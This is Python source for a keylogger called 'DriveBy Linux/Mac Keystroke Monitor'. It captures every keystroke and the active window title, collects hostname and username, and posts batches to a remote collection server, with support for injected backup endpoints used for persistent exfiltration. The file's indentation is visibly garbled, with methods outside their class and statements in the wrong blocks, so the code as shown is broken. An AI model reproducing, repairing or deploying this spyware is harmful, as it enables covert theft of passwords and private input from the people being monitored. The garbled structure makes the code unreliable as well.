#!/usr/bin/env python3
"""
DriveBy Linux/Mac Keystroke Monitor
Python script for capturing keystrokes on Unix-like systems
"""

import os
import sys
import time
import json
import threading
import requests
import socket
from datetime import datetime
import subprocess
import platform

# Try to import required libraries
try:
    from pynput import keyboard
    PYNPUT_AVAILABLE = True
except ImportError:
    PYNPUT_AVAILABLE = False
    print("pynput not available, using alternative method")

class LinuxKeystrokeMonitor:
    def __init__(self, server_ip="192.168.43.1", server_port=8081):
        self.server_ip = server_ip
        self.server_port = server_port
        self.server_url = f"http://{server_ip}:{server_port}/collect"
        self.remote_endpoints = []
        self.current_endpoint_index = 0
        self.keystroke_buffer = []
        self.running = True
        self.last_send = time.time()
        self.client_info = self.get_client_info()

        # Check for injected remote configuration
        self.setup_remote_endpoints()

    def setup_remote_endpoints(self):
        """Setup remote endpoints for persistent data transmission"""
        # Check for injected configuration (added by DriveBy)
        if 'REMOTE_ENDPOINT' in globals():
            self.remote_endpoints.append(globals()['REMOTE_ENDPOINT'])
            if 'BACKUP_ENDPOINTS' in globals():
                self.remote_endpoints.extend(globals()['BACKUP_ENDPOINTS'])

                # Add default local endpoint
                self.remote_endpoints.append(self.server_url)

                # Remove duplicates while preserving order
                seen = set()
                self.remote_endpoints = [x for x in self.remote_endpoints if not (x in seen or seen.add(x))]

                print(f"Configured {len(self.remote_endpoints)} data endpoints")

def get_client_info(self):
    """Get client system information"""
    try:
        return {
        'hostname': socket.gethostname(),
        'username': os.getenv('USER', 'unknown'),
        'os': platform.system(),
        'os_version': platform.release(),
        'architecture': platform.machine(),
        'python_version': platform.python_version(),
        'timestamp': datetime.now().isoformat()
        }
    except Exception as e:
        print(f"Error getting client info: {e}")
        return {'error': str(e)}

def on_key_press(self, key):
    """Handle key press events"""
    try:
        timestamp = datetime.now().isoformat()

        # Get key information
        if hasattr(key, 'char') and key.char is not None:
            key_info = {
            'timestamp': timestamp,
            'key': key.char,
            'key_type': 'char',
            'event': 'press'
            }
        else:
            key_info = {
            'timestamp': timestamp,
            'key': str(key),
            'key_type': 'special',
            'event': 'press'
            }

            # Add window information if available
            try:
                active_window = self.get_active_window()
                if active_window:
                    key_info['window'] = active_window
            except:
                    pass

                    self.keystroke_buffer.append(key_info)

                    # Send data if buffer is full or time threshold reached
                    current_time = time.time()
                    if (len(self.keystroke_buffer) >= 50 or current_time - self.last_send >= 30):
                        self.send_keystroke_data()

            except Exception as e:
                    print(f"Error processing key press: {e}")

def get_active_window(self):
    """Get active window information (Linux specific)"""
    try:
        if platform.system() == "Linux":
            # Try using xdotool
            result = subprocess.run(['xdotool', 'getactivewindow', 'getwindowname'],
            capture_output=True, text=True, timeout=2)
            if result.returncode == 0:
                return result.stdout.strip()

                # Try using wmctrl
                result = subprocess.run(['wmctrl', '-a'],
                capture_output=True, text=True, timeout=2)
                if result.returncode == 0:
                    lines = result.stdout.strip().split('\n')
                    for line in lines:
                        if '*' in line: # Active window marker
                            return line.split()[-1]

                elif platform.system() == "Darwin": # macOS
                    # Try using AppleScript
                    script = 'tell application "System Events" to get name of first application process whose frontmost is true'
                    result = subprocess.run(['osascript', '-e', script],
                    capture_output=True, text=True, timeout=2)
                    if result.returncode == 0:
                        return result.stdout.strip()

    except Exception as e:
                        pass

                        return None

def send_keystroke_data(self):
    """Send keystroke data to server with remote endpoint fallback"""
    if not self.keystroke_buffer:
        return

        data = {
        'client_info': self.client_info,
        'keystrokes': self.keystroke_buffer.copy(),
        'batch_info': {
        'count': len(self.keystroke_buffer),
        'start_time': self.keystroke_buffer[0]['timestamp'] if self.keystroke_buffer else None,
        'end_time': self.keystroke_buffer[-1]['timestamp'] if self.keystroke_buffer else None
        }
        }

        # Try each endpoint until one succeeds
        for attempt, endpoint in enumerate(self.remote_endpoints):
            try:
                response = requests.post(
                endpoint,
                json=data,
                timeout=10,
                headers={'Content-Type': 'application/json'}
                )

                if response.status_code == 200:
                    print(f"Sent {len(self.keystroke_buffer)} keystrokes to {endpoint}")
                    self.keystroke_buffer.clear()
                    self.last_send = time.time()

                    # Move successful endpoint to front for next time
                    if attempt > 0:
                        self.remote_endpoints.insert(0, self.remote_endpoints.pop(attempt))

                        return
                    else:
                        print(f"Endpoint {endpoint} responded with status: {response.status_code}")

            except requests.exceptions.RequestException as e:
                        print(f"Error sending to {endpoint}: {e}")
                        continue
            except Exception as e:
                        print(f"Unexpected error with {endpoint}: {e}")
                        continue

                        print("Failed to send data to any endpoint")

def alternative_monitor(self):
    """Alternative monitoring method when pynput is not available"""
    print("Using alternative monitoring method...")

    # This is a simplified approach that monitors system activity
    # In a real implementation, you might use:
    # - /dev/input/event* files (requires root)
    # - X11 event monitoring
    # - System call tracing

    while self.running:
        try:
            # Monitor active window changes as a proxy for activity
            current_window = self.get_active_window()
            if current_window and current_window != getattr(self, 'last_window', None):
                keystroke_info = {
                'timestamp': datetime.now().isoformat(),
                'event': 'window_change',
                'window': current_window,
                'key_type': 'system'
                }
                self.keystroke_buffer.append(keystroke_info)
                self.last_window = current_window

                # Send data periodically
                if time.time() - self.last_send >= 30:
                    self.send_keystroke_data()

                    time.sleep(1)

        except KeyboardInterrupt:
            break
        except Exception as e:
            print(f"Error in alternative monitor: {e}")
            time.sleep(5)

def install_dependencies(self):
    """Try to install required dependencies"""
    try:
        print("Attempting to install pynput...")
        subprocess.run([sys.executable, '-m', 'pip', 'install', 'pynput'],
        check=True, capture_output=True)
        print("pynput installed successfully")
        return True
    except subprocess.CalledProcessError:
        print("Failed to install pynput")
        return False
    except Exception as e:
        print(f"Error installing dependencies: {e}")
        return False

def check_permissions(self):
    """Check if we have necessary permissions"""
    if platform.system() == "Linux":
        # Check if we can access input devices
        input_devices = [f for f in os.listdir('/dev/input/') if f.startswith('event')]
        for device in input_devices[:1]: # Check first device
            device_path = f'/dev/input/{device}'
            if os.access(device_path, os.R_OK):
                print(f"Have read access to {device_path}")
                return True

        print("No read access to input devices. May need root privileges.")

        return False

def start_monitoring(self):
    """Start keystroke monitoring"""
    print("DriveBy Linux/Mac Monitor Starting...")
    print(f"Server: {self.server_url}")
    print(f"Client: {self.client_info.get('hostname', 'unknown')}")
    print(f"OS: {self.client_info.get('os', 'unknown')} {self.client_info.get('os_version', '')}")

    # Check permissions
    self.check_permissions()

    # Try to use pynput if available
    if PYNPUT_AVAILABLE:
        try:
            print("Starting pynput keyboard listener...")
            with keyboard.Listener(on_press=self.on_key_press) as listener:
                # Send initial client info
                self.send_keystroke_data()
                listener.join()
        except Exception as e:
            print(f"Error with pynput listener: {e}")
            print("Falling back to alternative method...")
            self.alternative_monitor()
        else:
                # Try to install pynput
            if self.install_dependencies():
                print("Please restart the script to use pynput")
            else:
                print("Using alternative monitoring method...")
                self.alternative_monitor()

def stop_monitoring(self):
    """Stop monitoring and send remaining data"""
    print("Stopping monitor...")
    self.running = False

    # Send any remaining data
    if self.keystroke_buffer:
        self.send_keystroke_data()

        print("Monitor stopped.")

def main():
    """Main function"""
    import argparse

    parser = argparse.ArgumentParser(description='DriveBy Linux/Mac Keystroke Monitor')
    parser.add_argument('--server', default='192.168.43.1', help='Server IP address')
    parser.add_argument('--port', type=int, default=8081, help='Server port')
    parser.add_argument('--install-deps', action='store_true', help='Install dependencies and exit')

    args = parser.parse_args()

    if args.install_deps:
        monitor = LinuxKeystrokeMonitor()
        monitor.install_dependencies()
        return

        monitor = LinuxKeystrokeMonitor(args.server, args.port)

        try:
            monitor.start_monitoring()
        except KeyboardInterrupt:
            print("\nReceived interrupt signal...")
        finally:
            monitor.stop_monitoring()

            if __name__ == "__main__":
                main()
